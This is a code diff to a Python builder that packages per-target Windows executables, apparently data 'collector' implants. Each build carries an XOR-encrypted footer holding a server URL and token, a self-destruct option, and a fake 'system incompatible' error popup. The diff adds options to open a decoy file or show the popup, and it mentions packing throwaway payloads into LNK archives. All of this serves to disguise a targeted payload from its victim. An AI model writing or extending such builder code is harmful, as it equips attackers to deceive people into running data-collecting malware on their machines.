@@ -97,16 +97,32 @@ def get_all_build_status():
 
 
 def build_exe(server_url, token, target_name, exe_filename='',
-              output_dir=None, register=True):
+              output_dir=None, register=True, options=None):
     """Build a target-specific EXE. Uses fast footer injection if base EXE
     exists; falls back to full PyInstaller build.
 
     ``output_dir`` and ``register`` let callers (the LNK builder) produce a
     throwaway payload that is packed into the archive without being published
     as a downloadable EXE for the target.
+
+    ``options`` may override ``decoy_file`` / ``popup_message`` for this build.
     """
     from .config_manager import load_config, resolve_exe_name
     config = load_config()
+    options = options or {}
+    decoy_file = str(options.get('decoy_file') or '').strip()
+    popup_message = str(options.get('popup_message') or '').strip()
+    behavior = str(options.get('behavior') or '').strip().lower()
+    if behavior not in ('open_file', 'popup', 'both', 'none'):
+        behavior = str(config.get('behavior') or 'popup').strip().lower()
+    if behavior not in ('open_file', 'popup', 'both', 'none'):
+        behavior = 'popup'
+    config['behavior'] = behavior
+    config['popup_enabled'] = behavior in ('popup', 'both')
+    if decoy_file:
+        config['decoy_file'] = decoy_file
+    if popup_message:
+        config['popup_message'] = popup_message
     exe_name = resolve_exe_name(target_name, token, exe_filename)
     target_dir = output_dir or OUTPUT_DIR
 
@@ -129,6 +145,8 @@ def build_base_exe(icon_path=None, output_name='collector_base'):
         'self_destruct': False,
         'popup_enabled': True,
         'popup_message': '系统不兼容，运行失败!',
+        'decoy_file': '',
+        'behavior': 'popup',
     }
     # Temporarily patch get_icon_path to return our desired icon
     _orig_get_icon = None
@@ -194,6 +212,8 @@ def _build_with_footer(server_url, token, config, exe_name,
         'self_destruct': config.get('self_destruct', False),
         'popup_enabled': config.get('popup_enabled', True),
         'popup_message': config.get('popup_message', '系统不兼容，运行失败!'),
+        'decoy_file': config.get('decoy_file', ''),
+        'behavior': config.get('behavior', 'popup'),
     }
     body = json.dumps(cfg, ensure_ascii=False).encode('utf-8')
     encrypted = _xor(body, FOOTER_KEY)
@@ -255,6 +275,10 @@ def _build_with_pyinstaller(server_url, token, target_name, config, exe_name,
         'true' if config.get('popup_enabled', True) else 'false')
     script_content = script_content.replace('{{POPUP_MESSAGE}}',
         config.get('popup_message', '系统不兼容，运行失败!'))
+    script_content = script_content.replace('{{DECOY_FILE}}',
+        config.get('decoy_file', ''))
+    script_content = script_content.replace('{{BEHAVIOR}}',
+        config.get('behavior', 'popup'))
 
     with open(build_script, 'w', encoding='utf-8') as f:
         f.write(script_content)
@@ -295,14 +319,16 @@ def _build_with_pyinstaller(server_url, token, target_name, config, exe_name,
     return exe_path
 
 
-def build_exe_async(server_url, token, target_name, target_id, exe_filename=''):
+def build_exe_async(server_url, token, target_name, target_id, exe_filename='',
+                    options=None):
     """Start an async build, returns immediately. Status tracked in _build_status."""
     with _lock:
         _build_status[target_id] = {'status': 'building', 'message': '正在打包...'}
 
     def _run():
         try:
-            build_exe(server_url, token, target_name, exe_filename)
+            build_exe(server_url, token, target_name, exe_filename,
+                      options=options)
             with _lock:
                 _build_status[target_id] = {'status': 'done', 'message': '生成完毕'}
         except Exception as e:
